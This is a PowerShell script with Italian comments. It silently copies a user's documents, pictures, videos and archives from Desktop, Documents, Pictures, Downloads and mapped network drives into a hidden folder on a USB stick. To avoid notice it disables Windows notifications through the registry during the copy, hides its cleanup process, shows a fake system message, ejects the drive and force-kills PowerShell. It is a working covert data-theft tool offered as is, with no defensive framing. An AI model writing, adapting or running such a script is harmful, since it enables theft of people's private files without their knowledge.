$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

# --- 1. CONFIGURAZIONE ---
$NomeChiavetta = "MIA_USB" 
$USB = Get-Volume | Where-Object { $_.FileSystemLabel -eq $NomeChiavetta -or $_.DriveType -eq 'Removable' } | Select-Object -First 1
if ($null -eq $USB) { exit }

$DriveLetter = $USB.DriveLetter
$USBPath = "$($DriveLetter):\"
$DestFolder = Join-Path $USBPath "System_Data_Vault"
$StopFile = Join-Path $USBPath "STOP.txt"
$StartTime = Get-Date
$LimiteFile = 250MB
$TempoMassimoMinuti = 30 
$LockFile = "$env:TEMP\sys_check.lock"

if (!(Test-Path $DestFolder)) { 
    New-Item -ItemType Directory -Path $DestFolder -Force > $null
    (Get-Item $DestFolder).Attributes = 'Hidden'
}

# --- 2. SILENZIAMENTO NOTIFICHE ---
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "NOC_GLOBAL_SETTING_TOASTS_ENABLED" /t REG_DWORD /d 0 /f > $null

# --- 3. RICERCA E COPIA ---
$Paths = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Downloads")
$Paths += Get-PSDrive -PSProvider FileSystem | Where-Object { $_.DisplayRoot -ne $null -and $_.Root -ne "C:\" -and $_.Root -ne "$($DriveLetter):\" } | Select-Object -ExpandProperty Root

foreach ($SourcePath in $Paths) {
    if (!(Test-Path $SourcePath)) { continue }
    $Files = Get-ChildItem -Path $SourcePath -Recurse -Include *.pdf,*.docx,*.xlsx,*.txt,*.jpg,*.png,*.mp4,*.zip -ErrorAction SilentlyContinue | 
             Where-Object { $_.Length -le $LimiteFile -and !$_.PSIsContainer }

    foreach ($File in $Files) {
        # Controllo interruzione: StopFile o Tempo scaduto
        if (Test-Path $StopFile) { break }
        if (((Get-Date) - $StartTime).TotalMinutes -ge $TempoMassimoMinuti) { break }
        
        try {
            $UniqueName = [System.IO.Path]::GetRandomFileName() + "_" + $File.Name
            [System.IO.File]::Copy($File.FullName, (Join-Path $DestFolder $UniqueName), $true)
        } catch { continue }
    }
    if (Test-Path $StopFile -or (((Get-Date) - $StartTime).TotalMinutes -ge $TempoMassimoMinuti)) { break }
}

# --- 4. RIPRISTINO E PREPARAZIONE CHIUSURA ---
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "NOC_GLOBAL_SETTING_TOASTS_ENABLED" /t REG_DWORD /d 1 /f > $null

$LocalFolder = "C:\Users\Public\Documents\SystemView"
$VBSMsg = "$env:TEMP\notifica.vbs"
"MsgBox `"Ora e possibile rimuovere l'hardware.`", 64, `"Sistema`"" | Out-File $VBSMsg -Encoding ASCII

# --- 5. SEQUENZA DI USCITA FORZATA ---
# Se esiste lo stop file, lo eliminiamo prima di procedere
if (Test-Path $StopFile) { Remove-Item $StopFile -Force }

# Comando per chiudere ogni finestra di Esplora Risorse aperta sulla chiavetta
$CloseWindows = "(New-Object -ComObject Shell.Application).Windows() | Where-Object { `$_.LocationURL -like '*$($DriveLetter):*' } | ForEach-Object { `$_.Quit() }"

# Esecuzione della pulizia finale tramite un processo CMD esterno per non restare appesi
$FinalAction = "powershell -Command `"$CloseWindows`" & rd /s /q `"$LocalFolder`" & del `"$LockFile`" & wscript.exe `"$VBSMsg`" & del `"$VBSMsg`" & powershell -Command `"(New-Object -ComObject Shell.Application).NameSpace(17).ParseName('$($DriveLetter):').InvokeVerb('Eject')`""

Start-Process cmd.exe -ArgumentList "/c $FinalAction" -WindowStyle Hidden

# Uccidiamo il processo PowerShell corrente per liberare i file sulla USB
Start-Sleep -Seconds 1
Stop-Process -Name powershell -Force